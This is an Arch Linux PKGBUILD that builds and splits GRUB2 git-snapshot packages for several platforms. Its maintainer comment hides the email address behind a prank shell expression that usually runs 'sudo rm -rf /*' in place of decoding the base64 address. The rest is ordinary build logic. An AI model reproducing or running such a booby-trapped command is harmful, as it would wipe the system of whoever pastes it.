# Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
pkgbase=grub2-git

### PACKAGE CONFIGURATION
pkgname=(
	grub2-x86_64-efi-git
	grub2-i386-pc-git
	grub2-i386-efi-git
	grub2-i386-qemu-git
	grub2-emu-git
	grub2-common-git
	grub2-doc-git
)

_extras=(
	'lua'
	'ntldr-img'
	'915resolution'
)

options=()

_conf_all=(--disable-werror)
_conf_emu=(--with-bootdir='/usr/lib')

# There is no such thing as an "optional make dependency"...
# If you do not want PFF2 Unifont in the common package, remove this line.
# (Any variant of Unifont will do, but depending on BDF because it's packaged officially.)
makedepends+=('bdf-unifont')

### PACKAGE BUILD INSTRUCTIONS
source=(grub::'git://git.savannah.gnu.org/grub.git#branch=master')
sha256sums=('SKIP')

pkgver=2.02+rc2
pkgrel=1
pkgdesc="GNU GRand Unified Bootloader: the ultimate package (git snapshot)"
arch=(i686 x86_64)
url="http://gnu.org/software/grub/"
license=('GPL3')
groups=()
depends=()
makedepends+=('git' 'python2')
checkdepends=('xorriso')
provides=()
replaces=()
backup=()

_wanted() {
	for _p in "${pkgname[@]}"; do
		[[ "$_p" == "$1" ]] && return 0
	done
	return 1
}

if [[ "${#_extras}" -gt 0 ]]; then
	source+=(grub-extras::'git://git.savannah.nongnu.org/grub-extras.git')
	sha256sums+=(SKIP)
fi

_wanted grub2-i386-qemu-git && makedepends+=('bdf-unifont')

source+=(
	archlinux_grub_mkconfig_fixes.patch
	i386_softdiv.patch
	grub-notice.install
)

sha256sums+=(
	'729168cd3df5b21cc613bf74a1f923bcf79ad3db99c1eb81e9be31aaf3211891'
	'fb69d0e9d820365abd961e4c6b3d0e3b09e337f6a01c47ad67900708b5c9b598'
	'90948b2035f806dc74fc878520e593a34f51e35e6f698391a6fe6eabf657bed2'
)

pkgver() {
	cd "$srcdir/grub"
	git describe --tags | sed -e 's/^grub-//; y/-/+/'
}

prepare() {
	cd "$srcdir/grub"
	if [[ "${#_extras}" -gt 0 ]]; then
		msg2 "Preparing extras"
		mkdir -p "$srcdir/extras"
		rm -f "$srcdir/extras"/*
		for _item in "${_extras[@]}"; do
			ln -sf "../grub-extras/$_item" "$srcdir/extras"
		done
	fi

	msg2 "Applying patches"
	patch -p1 < "$srcdir/archlinux_grub_mkconfig_fixes.patch"
	patch -p1 < "$srcdir/i386_softdiv.patch"

	msg2 "Importing translations"
	./linguas.sh
}

build() {
	export GRUB_CONTRIB="$srcdir/extras"

	cd "$srcdir/grub"
	msg2 "Generating configure script"
	PYTHON=/usr/bin/python2 ./autogen.sh

	for _item in "${pkgname[@]}"; do
		_item="${_item#grub2-}"
		_item="${_item%-git}"
		if [[ "$_item" = 'doc' || "$_item" = 'common' ]]; then
			_build_none=1
			continue
		fi

		_plat="${_item#*-}"
		_cpu="${_item%-*}"
		if [[ "$_cpu" = "$_plat" ]]; then
			_cpu=""
		fi
		_conf=("${_conf_all[@]}")
		eval "_conf+=(\"\${_conf_$_cpu[@]}\" \"\${_conf_$_plat[@]}\")"

		cd "$srcdir"
		rm -rf "build-$_item"
		msg2 "Configuring for $_item"
		mkdir -p "build-$_item"

		cd "$srcdir/build-$_item"
		eval "_CFLAGS=\"\$_CFLAGS_$_cpu \$_CFLAGS_$_plat\""
		eval "_LDFLAGS=\"\$_LDFLAGS_$_cpu \$_LDFLAGS_$_plat\""
		eval "_CPPFLAGS=\"\$_CPPFLAGS_$_cpu \$_CPPFLAGS_$_plat\""
		../grub/configure --quiet \
			--target="$_cpu" \
			--with-platform="$_plat" \
			--program-prefix='' \
			--prefix="/usr" \
			--bindir="/usr/bin" \
			--sbindir="/usr/bin" \
			--mandir="/usr/share/man" \
			--infodir="/usr/share/info" \
			--datarootdir="/usr/share" \
			--sysconfdir="/etc" \
			--with-bootdir="/boot" \
			--with-grubdir="grub" \
			"${_conf[@]}" \
			CFLAGS="$_CFLAGS" LDFLAGS="$_LDFLAGS" CPPFLAGS="$_CPPFLAGS" \
			HOST_CFLAGS="$CFLAGS" HOST_LDFLAGS="$LDFLAGS" HOST_CPPFLAGS="$CPPFLAGS"
	done

	if [[ "$_build_none" ]]; then
		msg2 "Configuring common items"
		cd "$srcdir"
		rm -rf "build-none"
		mkdir -p "build-none"

		cd "$srcdir/build-none"
		../grub/configure --quiet \
			--with-platform=none \
			--program-prefix='' \
			--prefix="/usr" \
			--bindir="/usr/bin" \
			--sbindir="/usr/bin" \
			--mandir="/usr/share/man" \
			--infodir="/usr/share/info" \
			--datarootdir="/usr/share" \
			--sysconfdir="/etc" \
			--with-bootdir="/boot" \
			--with-grubdir="grub" \
			"${_conf_none[@]}" \
			HOST_CFLAGS="$CFLAGS" HOST_LDFLAGS="$LDFLAGS" HOST_CPPFLAGS="$CPPFLAGS"
	fi

	for _item in "${pkgname[@]}"; do
		_item="${_item#grub2-}"
		_item="${_item%-git}"

		if [[ "$_item" = 'common' ]]; then
			msg2 "Building common items"
			cd "$srcdir/build-none"
			make
			continue
		elif [[ "$_item" = 'doc' ]]; then
			msg2 "Building documentation"
			cd "$srcdir/build-none/docs"
			make info
			make html
			continue
		fi

		_plat="${_item#*-}"
		_cpu="${_item%-*}"
		if [[ "$_cpu" = "$_plat" ]]; then
			_cpu=""
		fi

		msg2 "Building for $_item"
		cd "$srcdir/build-$_item"
		make ascii.h widthspec.h
		cd "$srcdir/build-$_item/grub-core"
		make -C gnulib
		make
	done
}

_package_plat() {
	depends+=("grub2-common-git=$pkgver")
	optdepends+=()

	cd "$srcdir/build-$1/grub-core"
	eval "$(
		. ./modinfo.sh
		echo "local _plat=${grub_modinfo_target_cpu}-${grub_modinfo_platform}"
	)"
	make install DESTDIR="$pkgdir"

	if check_option debug y; then
		if check_option strip y; then
			# hack to trick makepkg into creating the debug package
			mkdir -p "$pkgdir-debug/usr/lib/debug/.build-id"
			mkdir -p "$pkgdir-debug/usr/lib/grub/$_plat"

			_tostrip=(
				"$pkgdir/usr/lib/grub/$_plat"/kernel.exec
				"$pkgdir/usr/lib/grub/$_plat"/*.module
				"$pkgdir/usr/lib/grub/$_plat"/*.image
			)

			for _f in "${_tostrip[@]}"; do
				[[ ! -r "$_f" ]] && continue
				strip --only-keep-debug "$_f"
				chmod -x "$_f"
			done

			for _f in "${_tostrip[@]}" "$pkgdir/usr/lib/grub/$_plat"/gdb_grub; do
				[[ ! -r "$_f" ]] && continue # makepkg -R
				mv "$_f" "$pkgdir-debug/usr/lib/grub/$_plat"
			done
		fi
	else
		rm -rf "$pkgdir/usr/lib/grub/$_plat"/kernel.exec
		rm -rf "$pkgdir/usr/lib/grub/$_plat"/*.module
		rm -rf "$pkgdir/usr/lib/grub/$_plat"/*.image
		rm -rf "$pkgdir/usr/lib/grub/$_plat"/gdb_grub
	fi

	rmdir --ignore-fail-on-non-empty "$pkgdir/usr/bin"
}

package_grub2-common-git() {
	pkgdesc="GNU GRand Unified Bootloader: common utilities (git snapshot)"
	conflicts=('grub-common')
	provides=('grub-common')
	depends+=('device-mapper')
	optdepends=(
		'fuse: for grub-mount'
		'freetype2: for grub-mkfont'
		'os-prober: for detecting other OSes in grub-mkconfig'
		'efibootmgr: for grub-install EFI support'
	)
	backup=('etc/default/grub')
	install=grub-notice.install

	cd "$srcdir/build-none"
	make install DESTDIR="$pkgdir"

	rm -rf "$pkgdir/usr/share/info"
	rm -rf "$pkgdir/usr/lib/grub"
}

package_grub2-doc-git() {
	pkgdesc="GNU GRand Unified Bootloader: documentation (git snapshot)"
	arch=(any)

	cd "$srcdir/build-none/docs"
	make install-html DESTDIR="$pkgdir"
	make install-info DESTDIR="$pkgdir"
}

package_grub2-emu-git() {
	pkgdesc="GNU GRand Unified Bootloader: emulator (git snapshot)"
	provides+=("grub2-emu")
	conflicts+=('grub-emu' 'grub2-emu')
	depends+=('sdl' 'device-mapper')

	_package_plat emu
}

package_grub2-x86_64-efi-git() {
	pkgdesc="GNU GRand Unified Bootloader: x86-64 EFI modules (git snapshot)"
	conflicts+=('grub2-efi-x86_64')
	provides+=("grub2-efi-x86_64" "grub2-modules" "grub2-modules-git=$pkgver")

	_package_plat x86_64-efi
}

package_grub2-i386-pc-git() {
	pkgdesc="GNU GRand Unified Bootloader: i386 BIOS modules (git snapshot)"
	conflicts+=('grub2-bios')
	provides+=("grub2-bios" "grub2-modules" "grub2-modules-git=$pkgver")

	_package_plat i386-pc
}

package_grub2-i386-qemu-git() {
	pkgdesc="GNU GRand Unified Bootloader: i386 QEMU ROM modules (git snapshot)"

	_package_plat i386-qemu
}

package_grub2-i386-efi-git() {
	pkgdesc="GNU GRand Unified Bootloader: i386 EFI modules (git snapshot)"
	conflicts=('grub2-efi-i386')
	provides=("grub2-efi-i386" "grub2-modules" "grub2-modules-git=$pkgver")

	_package_plat i386-efi
}
